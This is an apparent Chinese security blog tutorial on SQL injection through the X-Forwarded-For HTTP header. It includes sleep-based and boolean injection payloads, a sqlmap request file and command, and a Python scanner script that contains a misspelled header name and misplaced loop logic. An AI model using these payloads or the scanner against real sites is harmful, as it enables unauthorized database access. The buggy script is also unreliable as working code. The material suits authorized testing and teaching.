## HTTP 请求头中的 X-Forwarded-For

X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid
缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案中正式提出。

当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。

如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。

X-Forwarded-For请求头格式非常简单，就这样：

    
    
    X-Forwarded-For: client1, proxy1, proxy2, proxy3

鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址,
这通常是一个比较可靠的信息来源。

在nginx反向代理中经常使用X-Forwarded-For 字段。我们往往会在配置文件中做如下配置:

    
    
    location / {
            ...
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_pass http://1xx.xxx.xxx.xxx;
        
        }

在反向代理的情况下，你可以追踪到互联网上连接到你的服务器的客户端的IP地址, 即使你的网络服务器和互联网在路由上是不可达的。这种情况下你不应该信任所有X-Forwarded-For信息，其中有部分可能是伪造的。因此需要建立一个信任白名单来确保X-Forwarded-For中哪些IP地址对你是可信的。

![](https://image.3001.net/images/20210830/1630292441_612c49d958126cf5633b2.png!small)

## 利用X-Forwarded-For进行sql注入

如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用String ip =
request.getHeader("X-Forwarded-For");进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip也可以是一些注入语句，如下：

    
    
    X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)--    
    
    String sql = "select * from table where ip = '"+ip+"'";

那么我们得到的sql语句就会是这样:

    
    
    select * from table where ip =1 and if(now()=sysdate(),sleep(6),0)--
## 在实际渗透中的利用

构造X-Forwoarded-For头进行测试，http响应出现变化：

    
    
    X-Forwarded-For: -1' OR 3*2*1=6 AND 000958=000958--
![](https://image.3001.net/images/20210830/1630294777_612c52f91abbde6d86ac8.png!small)

    
    
    X-Forwarded-For: -1' OR 3*2*1=6 AND 000958=000957--
![](https://image.3001.net/images/20210830/1630294820_612c53241e2f456d1815b.png!small)

由此可以判定可能存在注入漏洞的，然后我们丢到sqlmap工具里跑一波，复制RAW文件到r.txt中，这里构造的X-Forwarded-For值为*，经过测试构造为IP地址或者任意数字字母时，利用sqlmap跑的时候不会去识别此地方，这里利用*代替后成功执行。

    
    
    POST/GET /xxx/ HTTP/1.1
    
    Referer: xxxxx
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
    
    X-Forwarded-For: *
    
    Cookie: xxx
    
    X-Requested-With: XMLHttpRequest
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Encoding: gzip,deflate
    
    Content-Length: 0
    
    Host: xxxx
    
    Connection: Keep-alive

sqlmap命令：

    
    
    python3 sqlmap.py -r r.txt --random-agent 

最后成功跑出漏洞：

![](https://image.3001.net/images/20210830/1630295281_612c54f127064ee56ee8f.png!small)

## 编写简单的检测脚本

然后我们编写1个简单的poc去检测X-Forwarded-For注入漏洞，这里就先根据http响应出现的变化来做为漏洞点吧，脚本在此：

> <https://github.com/purple-WL/X-Forwoarded-For--SQL_inject>

脚本：

    
    
    import requests
    import sys
    from requests.packages import urllib3
    
    print('\033[1;34m################\033[0m█▄▄▄▄ ▄███▄   ██▄█▄▄▄▄ ▄███▄   ██▄\033[1;34m##################\033[0m\n')
    print('\033[1;34m################\033[0m█Author：PURPLE-WL ***  ▀███▀    █\033[1;34m##################\033[0m\n')
    print('\033[1;34m################\033[0m█Version: V1.0 ***      ▄███▄    █\033[1;34m##################\033[0m\n')
    print('\033[1;34m################\033[0m█https://github.com/purple-WL ***█\033[1;34m##################\033[0m\n')
    print('\033[1;34m################\033[0m█   ▀███▀   ███▀   ▐  █   ▀███▀  █\033[1;34m##################\033[0m\n')
    
    urllib3.disable_warnings()
    if len(sys.argv) == 1:
        print('请指定1个URL：格式为http(https)://xxx.com''\n'
              'eg: python3 X-Forwoarded-For-SQL_inject.py http://xxx.com''\n')
    else:
      url = sys.argv[1]
    
    
    
      '''proxies = {
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080",
      }'''
    
      with open('config/payload.txt',"r") as f:
         for line in f.readlines():
            line = line.strip()
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.3',
                       'X-Forwoarded-For': line,
                       'Referrer': url,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                       'Accept-Encoding': 'gzip, deflate, sdch,identity',
                       'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'
                       }
            headers1 = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.3',
                'Referrer': url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, sdch,identity',
                'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'
                }
    
            req = requests.get(url,headers=headers1,verify=False)
            resp = requests.get(url,headers=headers,verify=False)
         if resp.status_code != req.status_code:
            print("\033[0;32;47m %s                    + 存在X-Forwoarded-For注入漏洞 \033[0m" % (url))
         else:
            print("\033[0;31;47m %s                    - 未发现漏洞信息 \033[0m" % (url))

然后我们可以使用脚本来检测一下：

    
    
    python3 X-Forwoarded-For-SQL_inject.py https(http)://xxx.com

![](https://image.3001.net/images/20210830/1630295664_612c567003c4fea44bd23.png!small)

![](https://image.3001.net/images/20210830/1630295685_612c568567f0ab3ad3f6e.png!small)然后再利用sqlmap进一步利用跑出数据库：

![](https://image.3001.net/images/20210830/1630296227_612c58a3bbea5982e4d4d.png!small)

## 参考链接

> [HTTP 请求头中的 X-Forwarded-For﻿](https://www.jianshu.com/p/15f3498a7fad)
>
> [[ 墨者学院 ] SQL注入 —— X-Forwarded-> For注入漏洞实战](https://www.cnblogs.com/qtisec/p/11097191.html)
>
> [https://github.com/purple-WL/X-Forwoarded-For--> SQL_inject﻿](https://github.com/purple-WL/X-Forwoarded-For--SQL_inject)

